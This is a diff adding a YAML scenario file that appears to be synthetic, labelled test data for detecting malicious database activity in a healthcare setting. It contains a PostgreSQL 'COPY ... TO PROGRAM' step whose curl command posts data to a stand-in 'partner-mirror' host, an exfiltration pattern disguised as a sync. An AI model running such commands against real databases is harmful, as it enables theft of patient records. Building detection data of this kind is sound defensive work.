@@ -1,0 +1,23 @@
+scenario_id: gen_healthcare_13_data_tamper_mal_316
+family_id: gen_healthcare_13_data_tamper_mal_fam316
+domain: healthcare
+time_of_day: '23:50'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: INSERT INTO prescriptions DEFAULT VALUES
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 192.168.42.11
+      port: 9001
